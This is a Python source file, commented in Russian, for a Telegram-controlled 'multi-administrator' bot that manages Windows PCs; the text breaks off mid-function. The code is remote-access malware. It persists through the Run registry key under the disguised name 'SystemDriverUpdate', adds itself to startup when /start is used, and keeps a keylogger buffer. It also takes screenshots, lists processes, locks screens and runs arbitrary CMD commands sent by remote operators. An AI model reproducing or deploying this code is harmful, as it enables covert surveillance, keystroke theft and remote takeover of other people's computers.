# main_bot.py
"""
Основной бот системы мульти-администраторов v16.0
Интегрирует базу данных SQLite, HWID-идентификацию, сессионный контроль и управление устройствами
"""

import telebot
import os
import sys
import time
import subprocess
import threading
import pyautogui
import psutil
import tkinter as tk
import winreg as reg
from telebot import types
import ctypes
import zipfile
import urllib.request
import socket
import keyboard
import io
import shutil
import logging
import tempfile
from datetime import datetime

# Импорт модулей проекта
from config import *
from database import db, ROLE_SUPER_ADMIN, ROLE_ADMIN
from hwid_generator import generate_hwid, get_device_name as get_hwid_device_name

# Настройка логирования
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(LOG_FILE),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Инициализация бота
try:
    bot = telebot.TeleBot(BOT_TOKEN)
    logger.info("Бот инициализирован")
except Exception as e:
    logger.error(f"Ошибка инициализации бота: {e}")
    sys.exit(1)

# Глобальные переменные
LOCK_WINDOW = None
REG_PATH = r"Software\Microsoft\Windows\CurrentVersion\Run"
REG_NAME = "SystemDriverUpdate"
REG_NAME_KEY = "DeviceFriendlyName"
KEYLOG_BUFFER = []
MAX_BUFFER_SIZE = 50000

# HWID текущего устройства
CURRENT_HWID = generate_hwid()
CURRENT_DEVICE_NAME = get_hwid_device_name()

# Сессии администраторов (в памяти для быстрого доступа)
admin_sessions = {}  # {admin_id: {'device_id': device_id, 'device_hwid': hwid, 'session_id': session_id}}

# --- ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ---

def escape_html(text):
    """Экранирование HTML-символов"""
    return str(text).replace("&", "&").replace("<", "<").replace(">", ">")

def is_admin(user_id):
    """Проверка, является ли пользователь администратором"""
    admin = db.get_admin(user_id)
    return admin is not None

def is_super_admin(user_id):
    """Проверка, является ли пользователь супер-администратором"""
    return db.is_super_admin(user_id)

def get_admin_role(user_id):
    """Получение роли администратора"""
    admin = db.get_admin(user_id)
    return admin.get('role') if admin else None

def check_permission(user_id, required_role=ROLE_ADMIN):
    """Проверка прав доступа"""
    if required_role == ROLE_SUPER_ADMIN:
        return is_super_admin(user_id)
    
    admin = db.get_admin(user_id)
    if not admin:
        return False
    
    role = admin.get('role')
    if role == ROLE_SUPER_ADMIN:
        return True
    elif role == ROLE_ADMIN and required_role == ROLE_ADMIN:
        return True
    
    return False

def get_current_device_name():
    """Получение имени текущего устройства"""
    try:
        key = reg.OpenKey(reg.HKEY_CURRENT_USER, REG_PATH, 0, reg.KEY_READ)
        try:
            name, _ = reg.QueryValueEx(key, REG_NAME_KEY)
            reg.CloseKey(key)
            return str(name)
        except FileNotFoundError:
            reg.CloseKey(key)
    except:
        pass
    return CURRENT_DEVICE_NAME

def set_device_name_reg(new_name):
    """Установка имени устройства в реестре"""
    try:
        key = reg.OpenKey(reg.HKEY_CURRENT_USER, REG_PATH, 0, reg.KEY_ALL_ACCESS)
        reg.SetValueEx(key, REG_NAME_KEY, 0, reg.REG_SZ, str(new_name))
        reg.CloseKey(key)
        return True
    except:
        return False

def add_to_startup(file_path=None):
    """Добавление в автозагрузку"""
    if file_path is None:
        file_path = sys.executable
    try:
        key = reg.OpenKey(reg.HKEY_CURRENT_USER, REG_PATH, 0, reg.KEY_ALL_ACCESS)
        reg.SetValueEx(key, REG_NAME, 0, reg.REG_SZ, file_path)
        reg.CloseKey(key)
        return True
    except:
        return False

def remove_from_startup():
    """Удаление из автозагрузки"""
    try:
        key = reg.OpenKey(reg.HKEY_CURRENT_USER, REG_PATH, 0, reg.KEY_ALL_ACCESS)
        try:
            reg.DeleteValue(key, REG_NAME)
        except:
            pass
        reg.CloseKey(key)
    except:
        return False

# --- РЕГИСТРАЦИЯ УСТРОЙСТВА ---

def register_device():
    """Регистрация текущего устройства в базе данных"""
    try:
        # Получаем IP-адрес
        ip_address = None
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip_address = s.getsockname()[0]
            s.close()
        except:
            pass
        
        # Добавляем устройство в базу данных
        device_name = get_current_device_name()
        if not db.get_device(CURRENT_HWID):
            db.add_device(CURRENT_HWID, device_name, ip_address)
            logger.info(f"Устройство зарегистрировано: {device_name} (HWID: {CURRENT_HWID})")
        
        # Обновляем время последней активности
        db.update_device_last_online(CURRENT_HWID)
        
        return True
    except Exception as e:
        logger.error(f"Ошибка регистрации устройства: {e}")
        return False

# --- УПРАВЛЕНИЕ СЕССИЯМИ ---

def get_admin_session(admin_id):
    """Получение активной сессии администратора"""
    # Сначала проверяем кэш в памяти
    if admin_id in admin_sessions:
        session_data = admin_sessions[admin_id]
        # Проверяем, что сессия все еще активна в базе данных
        session = db.get_active_session(admin_id)
        if session and session.get('id') == session_data.get('session_id'):
            return session_data
    
    # Если нет в кэше, получаем из базы данных
    session = db.get_active_session(admin_id)
    if session:
        device_id = session.get('device_id')
        device = db.get_device_by_id(device_id) if device_id else None
        session_data = {
            'device_id': device_id,
            'device_hwid': device.get('hwid') if device else None,
            'session_id': session.get('id')
        }
        admin_sessions[admin_id] = session_data
        return session_data
    
    return None

def set_admin_session(admin_id, device_hwid=None):
    """Установка активной сессии для администратора"""
    try:
        # Завершаем предыдущую сессию
        old_session = db.get_active_session(admin_id)
        if old_session:
            db.end_session(old_session.get('id'))
        
        # Получаем ID устройства по HWID
        device_id = None
        if device_hwid:
            device = db.get_device(device_hwid)
            if device:
                device_id = device.get('id')
        
        # Создаем новую сессию
        session_id = db.create_session(admin_id, device_id)
        
        # Обновляем кэш
        admin_sessions[admin_id] = {
            'device_id': device_id,
            'device_hwid': device_hwid,
            'session_id': session_id
        }
        
        logger.info(f"Сессия установлена для admin_id={admin_id}, device_hwid={device_hwid}")
        return True
    except Exception as e:
        logger.error(f"Ошибка установки сессии: {e}")
        return False

def get_target_device_hwid(admin_id):
    """Получение HWID целевого устройства для администратора"""
    session = get_admin_session(admin_id)
    if session and session.get('device_hwid'):
        return session.get('device_hwid')
    return CURRENT_HWID  # По умолчанию текущее устройство

# --- ОСНОВНЫЕ КОМАНДЫ ---

@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    """Приветственное сообщение и справка"""
    user_id = message.from_user.id
    
    if not is_admin(user_id):
        bot.reply_to(message, "❌ Доступ запрещен. Вы не являетесь администратором.")
        return
    
    # Регистрируем устройство при первом запуске
    register_device()
    add_to_startup()
    
    name = escape_html(get_current_device_name())
    role = get_admin_role(user_id) or "unknown"
    
    text = (f"🤖 <b>Система мульти-администраторов v16.0</b>\n"
           f"👤 Устройство: <b>{name}</b>\n"
           f"👑 Ваша роль: <b>{role}</b>\n"
           f"🆔 HWID: <code>{CURRENT_HWID[:8]}...</code>\n\n"
           "<b>Основные команды:</b>\n"
           "/panel - 🎛 Главная панель с выбором устройства\n"
           "/info - 📊 Статус устройства\n"
           "/pc_list - 💻 Список устройств\n"
           "/admin_list - 👥 Список администраторов\n\n"
           "<b>Управление устройством:</b>\n"
           "/lock - 🔒 Блокировка экрана\n"
           "/unlock - 🔓 Разблокировка\n"
           "/screen - 📸 Скриншот\n"
           "/procs - 🖥 Список процессов\n"
           "/cs <cmd> - 💻 Выполнить команду CMD\n\n"
           "<b>Для SuperAdmin:</b>\n"
           "/add_admin <id> - Добавить администратора\n"
           "/del_admin <id> - Удалить администратора")
    
    bot.reply_to(message, text, parse_mode='HTML')
    db.log_action(user_id, None, "start_command")

@bot.message_handler(commands=['info'])
def info_cmd(message):
    """Информация об устройстве"""
    user_id = message.from_user.id
    
    if not check_permission(user_id, ROLE_ADMIN):
        bot.reply_to(message, "❌ Недостаточно прав.")
        return
    
    try:
        uptime = time.time() - psutil.boot_time()
        uptime_h = int(uptime // 3600)
        name = escape_html(get_current_device_name())
        
        # Получаем информацию о системе
        cpu_percent = psutil.cpu_percent(interval=1)
        memory = psutil.virtual_memory()
        disk = psutil.disk_usage('/')
        
        text = (f"📊 <b>Системная информация ({name}):</b>\n\n"
               f"🆔 HWID: <code>{CURRENT_HWID}</code>\n"
               f"⏱ Аптайм: {uptime_h} часов\n"
               f"🔒 Блокировка: {'🔴 ВКЛ' if LOCK_WINDOW else '🟢 ВЫКЛ'}\n\n"
               f"💻 CPU: {cpu_percent}%\n"
               f"💾 RAM: {memory.percent}% ({memory.used//1024//1024} МБ / {memory.total//1024//1024} МБ)\n"
               f"💿 Disk: {disk.percent}% ({disk.used//1024//1024//1024} ГБ / {disk.total//1024//1024//1024} ГБ)\n\n"
               f"👥 Администраторов: {len(db.get_all_admins())}\n"
               f"💻 Устройств в системе: {len(db.get_all_devices())}")
        
        bot.reply_to(message, text, parse_mode='HTML')
        db.log_action(user_id, None, "info_command")
    except Exception as e:
        bot.reply_to(message, f"❌ Ошибка: {e}")

@bot.message_handler(commands=['panel'])
def panel_cmd(message):
    """Главная панель с выбором устройства"""
    user_id = message.from_user.id
    
    if not check_permission(user_id, ROLE_ADMIN):
        bot.reply_to(message, "❌ Недостаточно прав.")
        return
    
    # Получаем список устройств
    devices = db.get_all_devices()
    
    # Создаем inline клавиатуру
    markup = types.InlineKeyboardMarkup(row_width=2)
    
    # Кнопки для выбора устройства
    for device in devices[:8]:  # Ограничиваем 8 устройствами
        device_name = device['device_name']
        hwid_short = device['hwid'][:8]
        btn_text = f"💻 {device_name}"
        callback_data = f"select_device_{device['hwid']}"
        markup.add(types.InlineKeyboardButton(btn_text, callback_data=callback_data))
    
    # Кнопки управления
    markup.row(
        types.InlineKeyboardButton("🔒 Блокировка", callback_data="action_lock"),
        types.InlineKeyboardButton("🔓 Разблокировка", callback_data="action_unlock")
    )
    markup.row(
        types.InlineKeyboardButton("📸 Скриншот", callback_data="action_screen"),
        types.InlineKeyboardButton("🖥 Процессы", callback_data="action_procs")
    )
    markup.row(
        types.InlineKeyboardButton("💻 CMD", callback_data="action_cmd_menu"),
        types.InlineKeyboardButton("ℹ️ Инфо", callback_data="action_info")
    )
    
    # Текущее выбранное устройство
    session = get_admin_session(user_id)
    current_device = "Текущее" if not session or not session.get('device_hwid') else db.get_device(session.get('device_hwid')).get('device_name', 'Unknown')
    
    text = f"🎛 <b>Главная панель управления</b>\n\nВыберите устройство или действие:\nТекущее: <b>{current_device}</b>"
    
    bot.reply_to(message, text, reply_markup=markup, parse_mode='HTML')
    db.log_action(user_id, None, "panel_command")

# --- КОМАНДЫ УПРАВЛЕНИЯ АДМИНИСТРАТОРАМИ ---

@bot.message_handler(commands=['add_admin'])
def add_admin_cmd(message):
    """Добавление нового администратора (только для SuperAdmin)"""
    user_id = message.from_user.id
    
    if not check_permission(user_id, ROLE_SUPER_ADMIN):
        bot.reply_to(message, "❌ Недостаточно прав. Только SuperAdmin может добавлять администраторов.")
        return
    
    try:
        args = message.text.split()
        if len(args) < 2:
            bot.reply_to(message, "⚠️ Использование: /add_admin <telegram_id> [роль]\nРоли: super_admin, admin")
            return
        
        new_admin_id = int(args[1])
        role = args[2] if len(args) > 2 else ROLE_ADMIN
        
        if role not in [ROLE_SUPER_ADMIN, ROLE_ADMIN]:
            bot.reply_to(message, "❌ Неверная роль. Допустимые роли: super_admin, admin")
            return
        
        # Проверяем, не пытаемся ли добавить второго SuperAdmin
        if role == ROLE_SUPER_ADMIN:
            # Получаем всех SuperAdmin
            all_admins = db.get_all_admins()
            super_admin_count = sum(1 for admin in all_admins if admin.get('role') == ROLE_SUPER_ADMIN)
            if super_admin_count >= 1 and new_admin_id != SUPER_ADMIN_ID:
                bot.reply_to(message, "❌ Можно иметь только одного SuperAdmin (кроме изначального).")
                return
        
        # Добавляем администратора
        username = message.from_user.username or f"user_{new_admin_id}"
        if db.add_admin(new_admin_id, username, role):
            bot.reply_to(message, f"✅ Администратор добавлен:\nID: {new_admin_id}\nРоль: {role}")
            db.log_action(user_id, None, "add_admin", f"Added admin {new_admin_id} with role {role}")
        else:
            bot.reply_to(message, "❌ Ошибка добавления администратора.")
    except ValueError:
        bot.reply_to(message, "❌ Неверный формат ID. ID должен быть числом.")
    except Exception as e:
        bot.reply_to(message, f"❌ Ошибка: {e}")

@bot.message_handler(commands=['del_admin'])
def del_admin_cmd(message):
    """Удаление администратора"""
    user_id = message.from_user.id
    
    if not check_permission(user_id, ROLE_SUPER_ADMIN):
        bot.reply_to(message, "❌ Недостаточно прав. Т